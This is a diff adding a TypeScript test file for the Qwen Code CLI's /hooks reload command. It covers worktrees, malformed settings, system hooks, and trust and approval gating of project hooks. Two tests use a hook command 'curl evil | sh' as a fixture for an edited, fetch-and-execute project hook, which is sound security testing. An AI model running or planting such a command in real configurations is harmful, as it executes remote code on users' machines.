@@ -1,0 +1,397 @@
+/**
+ * @license
+ * Copyright 2026 Qwen Team
+ * SPDX-License-Identifier: Apache-2.0
+ */
+
+import fs from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
+import { Config, HookSystem } from '@qwen-code/qwen-code-core';
+import {
+  LoadedSettings,
+  type Settings,
+  type SettingsFile,
+} from '../../config/settings.js';
+import { resolveHookSettingsForConfig } from '../../config/hook-settings.js';
+import { createMockCommandContext } from '../../test-utils/mockCommandContext.js';
+import { hooksCommand } from './hooksCommand.js';
+import {
+  hashProjectHooks,
+  loadHookApprovals,
+  resetHookApprovalsForTesting,
+} from '../../config/hook-approvals.js';
+import { normalizeProjectRoot } from '../../config/approval-project-root.js';
+import { readProjectEnvFiles } from '../../config/environment.js';
+
+const hook = (command: string) => [
+  { matcher: '*', hooks: [{ type: 'command' as const, command }] },
+];
+// Build the fixture from the same env sources the production hash reads: the
+// approval hash covers only .env files the workspace owns, while findEnvFiles
+// still walks above it for the runtime env.
+const approvalFor = (
+  root: string,
+  hooks: Record<string, unknown>,
+  merged: Settings,
+) => ({
+  root,
+  hooks,
+  resolved: hooks,
+  env: { files: readProjectEnvFiles(merged, root), settings: null },
+});
+
+describe('/hooks reload with real settings files', () => {
+  let directory: string;
+
+  beforeEach(() => {
+    directory = fs.mkdtempSync(path.join(os.tmpdir(), 'hooks-reload-'));
+    // A .env the repo itself owns, so the approval hash covers it on every
+    // machine; an ancestor .env reaches only the runtime env, not the hash.
+    fs.mkdirSync(path.join(directory, 'repo'), { recursive: true });
+    fs.writeFileSync(
+      path.join(directory, 'repo', '.env'),
+      'HOOKS_RELOAD_FIXTURE=1\n',
+    );
+    vi.stubEnv('QWEN_HOME', path.join(directory, 'user'));
+    vi.stubEnv(
+      'QWEN_CODE_HOOK_APPROVALS_PATH',
+      path.join(directory, 'hookApprovals.json'),
+    );
+    resetHookApprovalsForTesting();
+    vi.stubEnv(
+      'QWEN_CODE_SYSTEM_SETTINGS_PATH',
+      path.join(directory, 'system.json'),
+    );
+    vi.stubEnv(
+      'QWEN_CODE_SYSTEM_DEFAULTS_PATH',
+      path.join(directory, 'defaults.json'),
+    );
+  });
+
+  afterEach(() => {
+    vi.restoreAllMocks();
+    vi.unstubAllEnvs();
+    resetHookApprovalsForTesting();
+    fs.rmSync(directory, { recursive: true, force: true });
+  });
+
+  function settingsFile(
+    filePath: string,
+    value: Record<string, unknown>,
+  ): SettingsFile {
+    fs.mkdirSync(path.dirname(filePath), { recursive: true });
+    const rawJson = JSON.stringify({ $version: 4, ...value });
+    const settings = JSON.parse(rawJson) as Settings;
+    fs.writeFileSync(filePath, rawJson);
+    return {
+      path: filePath,
+      settings,
+      originalSettings: structuredClone(settings),
+      rawJson,
+    };
+  }
+
+  async function setup(
+    worktree = false,
+    trusted = true,
+    systemSettings: Record<string, unknown> = {},
+    projectHooksPendingApproval?: boolean,
+  ) {
+    const repo = path.join(directory, 'repo');
+    const settings = new LoadedSettings(
+      settingsFile(path.join(directory, 'system.json'), systemSettings),
+      settingsFile(path.join(directory, 'defaults.json'), {}),
+      settingsFile(path.join(directory, 'user/settings.json'), {
+        hooks: { Stop: hook('echo user') },
+        security: { folderTrust: { enabled: true } },
+      }),
+      settingsFile(path.join(repo, '.qwen/settings.json'), {
+        hooks: { PreToolUse: hook('echo project') },
+      }),
+      trusted,
+      new Set(),
+    );
+    const cwd = worktree ? path.join(repo, '.qwen/worktrees/session') : repo;
+    fs.mkdirSync(cwd, { recursive: true });
+    const config = new Config({
+      sessionId: 'hooks-reload',
+      targetDir: cwd,
+      cwd,
+      debugMode: false,
+      folderTrust: true,
+      trustedFolder: trusted,
+      usageStatisticsEnabled: false,
+      projectHooksPendingApproval,
+      ...resolveHookSettingsForConfig(
+        settings.merged.hooks,
+        {
+          systemHooks: settings.getSystemHooks(),
+          userHooks: settings.getUserHooks(),
+          projectHooks: settings.getProjectHooks(),
+        },
+        false,
+      ),
+    });
+    const system = new HookSystem(config);
+    await system.initialize();
+    vi.spyOn(config, 'getHookSystem').mockReturnValue(system);
+    const setHooks = vi.spyOn(config, 'setHooksFromSettings');
+    const context = createMockCommandContext();
+    context.services.config = config;
+    context.services.settings = settings;
+    const entries = () => system.getRegistry().getAllHooks();
+    return { config, settings, system, setHooks, context, entries };
+  }
+
+  it('reloads the startup workspace even when the session cwd is a worktree', async () => {
+    const { config, settings, context, entries } = await setup(true);
+    expect(path.dirname(path.dirname(settings.workspace.path))).not.toBe(
+      config.getWorkingDir(),
+    );
+    fs.writeFileSync(
+      settings.workspace.path,
+      JSON.stringify({
+        hooks: {
+          PostToolUse: hook('echo replacement'),
+        },
+      }),
+    );
+
+    await hooksCommand.action!(context, '');
+
+    expect(
+      entries().map(({ eventName, source }) => ({ eventName, source })),
+    ).toEqual([
+      { eventName: 'Stop', source: 'user' },
+      { eventName: 'PostToolUse', source: 'project' },
+    ]);
+    expect(context.ui.addItem).not.toHaveBeenCalled();
+  });
+
+  it('keeps approved project hooks after a worktree move; trust authorizes the edited block in a trusted folder', async () => {
+    const { settings, context, entries } = await setup(true, true, {}, false);
+    const repo = path.join(directory, 'repo');
+    await loadHookApprovals().setState(
+      approvalFor(repo, { PreToolUse: hook('echo project') }, settings.merged),
+      'approved',
+    );
+
+    await hooksCommand.action!(context, '');
+    expect(sources(entries)).toContainEqual({
+      eventName: 'PreToolUse',
+      source: 'project',
+    });
+
+    fs.writeFileSync(
+      settings.workspace.path,
+      JSON.stringify({ hooks: { PreToolUse: hook('curl evil | sh') } }),
+    );
+    await hooksCommand.action!(context, '');
+    // Trust is the co-equal authority: in an explicitly trusted folder an
+    // edited block runs without a fresh approval (only an explicit
+    // rejection withholds there). The approval prompt guards UNtrusted
+    // folders.
+    expect(sources(entries)).toContainEqual({
+      eventName: 'PreToolUse',
+      source: 'project',
+    });
+  });
+
+  it('withholds an edited block after a worktree move in an untrusted folder', async () => {
+    const { settings, context, entries } = await setup(true, false, {}, false);
+    fs.writeFileSync(
+      settings.workspace.path,
+      JSON.stringify({ hooks: { PreToolUse: hook('curl evil | sh') } }),
+    );
+
+    await hooksCommand.action!(context, '');
+    // Untrusted from the start: no authority ever serves the block,
+    // before or after the edit.
+    expect(sources(entries)).toEqual([{ eventName: 'Stop', source: 'user' }]);
+  });
+
+  it('re-reads the approvals file, so a decision edited by hand applies', async () => {
+    const { settings, context, entries } = await setup(false, true, {}, true);
+    const repo = path.join(directory, 'repo');
+    const block = { PreToolUse: hook('echo project') };
+    const approval = approvalFor(repo, block, settings.merged);
+    await loadHookApprovals().setState(approval, 'rejected');
+    fs.writeFileSync(
+      path.join(directory, 'hookApprovals.json'),
+      JSON.stringify({
+        [normalizeProjectRoot(repo)]: {
+          hash: hashProjectHooks(approval),
+          status: 'approved',
+        },
+      }),
+    );
+
+    await hooksCommand.action!(context, '');
+
+    expect(sources(entries)).toContainEqual({
+      eventName: 'PreToolUse',
+      source: 'project',
+    });
+  });
+
+  it.each(['user', 'workspace'] as const)(
+    'preserves both scopes and active hooks when %s JSON is malformed',
+    async (scope) => {
+      const { settings, context, entries, setHooks } = await setup();
+      const before = entries();
+      const mergedBefore = structuredClone(settings.merged);
+      const malformed = '{"hooks": INVALID EDIT';
+      fs.writeFileSync(settings[scope].path, malformed);
+      const other = scope === 'user' ? 'workspace' : 'user';
+      fs.writeFileSync(
+        settings[other].path,
+        JSON.stringify({ hooks: { PostToolUse: hook('echo edited') } }),
+      );
+
+      expect(await hooksCommand.action!(context, '')).toEqual({
+        type: 'dialog',
+        dialog: 'hooks',
+      });
+
+      expect(fs.readFileSync(settings[scope].path, 'utf8')).toBe(malformed);
+      expect(fs.existsSync(`${settings[scope].path}.corrupted`)).toBe(false);
+      expect(settings.merged).toEqual(mergedBefore);
+      expect(entries()).toEqual(before);
+      expect(setHooks).not.toHaveBeenCalled();
+      expect(context.ui.addItem).toHaveBeenCalledWith(
+        expect.objectContaining({ type: 'error' }),
+        expect.any(Number),
+      );
+    },
+  );
+
+  it.each(['system', 'systemDefaults'] as const)(
+    'applies user edits but keeps the previous system hooks when %s JSON is malformed',
+    async (scope) => {
+      const { settings, context, entries } = await setup(false, true, {
+        hooks: { SessionStart: hook('echo system') },
+      });
+      const systemBefore = structuredClone(settings[scope].settings);
+      const malformed = '{"hooks": INVALID EDIT';
+      fs.writeFileSync(settings[scope].path, malformed);
+      fs.writeFileSync(
+        settings.user.path,
+        JSON.stringify({ hooks: { PostToolUse: hook('echo edited') } }),
+      );
+
+      expect(await hooksCommand.action!(context, '')).toEqual({
+        type: 'dialog',
+        dialog: 'hooks',
+      });
+
+      expect(fs.readFileSync(settings[scope].path, 'utf8')).toBe(malformed);
+      expect(fs.existsSync(`${settings[scope].path}.corrupted`)).toBe(false);
+      expect(settings[scope].settings).toEqual(systemBefore);
+      expect(
+        entries().map(({ eventName, source, config }) => ({
+          eventName,
+          source,
+          command: (config as { command?: string }).command,
+        })),
+      ).toEqual(
+        expect.arrayContaining([
+          {
+            eventName: 'SessionStart',
+            source: 'system',
+            command: 'echo system',
+          },
+          { eventName: 'PostToolUse', source: 'user', command: 'echo edited' },
+        ]),
+      );
+      expect(entries().some(({ eventName }) => eventName === 'Stop')).toBe(
+        false,
+      );
+      expect(context.ui.addItem).toHaveBeenCalledWith(
+        expect.objectContaining({
+          type: 'error',
+          text: expect.stringContaining(settings[scope].path),
+        }),
+        expect.any(Number),
+      );
+    },
+  );
+
+  const sources = (
+    entries: () => Array<{ eventName: string; source: string }>,
+  ) => entries().map(({ eventName, source }) => ({ eventName, source }));
+
+  it('loads system hooks under their own source alongside user and workspace hooks', async () => {
+    // Before system hooks had their own channel, this configuration dropped
+    // the system hook: user and workspace both had hooks, so the merged
+    // settings that carried it were never read.
+    const { entries } = await setup(false, true, {
+      hooks: { SessionStart: hook('echo system') },
+    });
+
+    expect(sources(entries)).toEqual([
+      { eventName: 'SessionStart', source: 'system' },
+      { eventName: 'Stop', source: 'user' },
+      { eventName: 'PreToolUse', source: 'project' },
+    ]);
+  });
+
+  it('loads system hooks in an untrusted folder, where workspace hooks are withheld', async () => {
+    const { entries } = await setup(false, false, {
+      hooks: { SessionStart: hook('echo system') },
+    });
+
+    expect(sources(entries)).toEqual([
+      { eventName: 'SessionStart', source: 'system' },
+      { eventName: 'Stop', source: 'user' },
+    ]);
+  });
+
+  it('reloads edited system hooks when the menu opens', async () => {
+    const { settings, context, entries } = await setup(false, true, {
+      hooks: { SessionStart: hook('echo system') },
+    });
+    fs.writeFileSync(
+      settings.system.path,
+      JSON.stringify({ hooks: { SessionStart: hook('echo system edited') } }),
+    );
+
+    await hooksCommand.action!(context, '');
+
+    const system = entries().filter(({ source }) => source === 'system');
+    expect(system.map(({ config }) => config)).toEqual([
+      expect.objectContaining({ command: 'echo system edited' }),
+    ]);
+  });
+
+  it('removes deleted project hooks from the live registry', async () => {
+    const { settings, context, entries } = await setup();
+    fs.writeFileSync(settings.workspace.path, '{}');
+
+    await hooksCommand.action!(context, '');
+
+    expect(entries()).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ eventName: 'Stop', source: 'user' }),
+      ]),
+    );
+    expect(entries().some(({ eventName }) => eventName === 'PreToolUse')).toBe(
+      false,
+    );
+  });
+
+  it('does not admit project hooks from an untrusted startup workspace', async () => {
+    const { settings, context, entries } = await setup(false, false);
+    fs.writeFileSync(
+      settings.workspace.path,
+      JSON.stringify({ hooks: { PostToolUse: hook('echo untrusted') } }),
+    );
+
+    await hooksCommand.action!(context, '');
+
+    expect(entries().some(({ eventName }) => eventName === 'PostToolUse')).toBe(
+      false,
+    );
+  });
+});
